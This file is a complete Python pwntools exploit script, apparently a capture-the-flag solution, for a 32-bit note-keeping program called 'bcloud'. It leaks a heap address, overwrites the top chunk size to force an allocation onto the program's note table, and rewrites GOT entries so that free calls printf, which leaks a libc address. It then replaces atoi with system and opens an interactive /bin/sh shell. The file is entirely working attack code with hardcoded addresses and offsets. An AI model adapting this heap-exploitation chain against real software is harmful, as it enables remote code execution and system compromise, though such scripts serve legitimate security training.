from pwn import *

debug = 1
if debug:
  #context.log_level = "DEBUG"
  p = process('./bcloud')
else:
  p = remote()

def new(len, data):
  p.recvuntil(">>\n")
  p.sendline('1')
  p.recvuntil("Input the length of the note content:\n")
  r = str(len)
  p.sendline(r)
  p.recvuntil("Input the content:\n")
  p.send(data)

def edit(index, data):
  p.recvuntil(">>\n")
  p.sendline('3')
  p.recvuntil("Input the id:\n")
  p.sendline(str(index))
  p.recvuntil("Input the new content:\n")
  p.send(data)

def delete(index):
  p.recvuntil(">>\n")
  p.sendline('4')
  p.recvuntil("Input the id:\n")
  p.sendline(str(index))
  

p.recvuntil("Input your name:\n")
p.send('a'*64)
r = p.recvline()
heap_addr = u32(r[68:72])
base_heap = heap_addr - 0x8
heap_top = base_heap + 0xD8 #216
print "base_heap: " + hex(base_heap)

p.recvuntil("Org:\n")
p.send('o'*64)
p.recvuntil("Host:\n")
p.sendline("\xff\xff\xff\xff")
raw_input("init?go")

bss_len_addr = 0x0804B0a0
free_got = 0x0804B014
printf_plt = 0x080484D0
atoi_got = 0x0804B03C
read_got = 0x0804B00C

n = bss_len_addr - 8 - heap_top - 8  #just do as it
print "size: " + hex(int(n))

new(n, "\n")
new(160, "/bin/sh\x00" + "\n")
#raw_input()
#edit(1, 'aaaaaaaa'+"\n")
#raw_input("go")

payload = p32(4)   #id0's length
payload += p32(4)   #id1's length
payload += p32(4)   #id2's length
payload += 'a' * 0x74
payload += p32(free_got)   #id0's pointer    change it carefully!!
payload += p32(printf_plt) #id1's pointer
payload += p32(atoi_got)   #id2's pointer
payload += p32(read_got)   #id3's pointer

edit(1, payload + "\n")
edit( 0, p32(printf_plt) )  #free-got-->printf_plt

delete(3)  #free(id0's pointer)  -->printf(atoi_got)
read_addr = u32(p.recv(4))
print "read_addr: " + hex(read_addr)
#raw_input("g0")


libc_base = read_addr - 0xdaf60
print "libc_base: " + hex(libc_base)
system_addr = libc_base + 0x40310
print "system_addr: " + hex(system_addr)

edit(2, p32(system_addr))

p.recvuntil(">>\n")
p.sendline('/bin/sh\x00')

p.interactive()

    

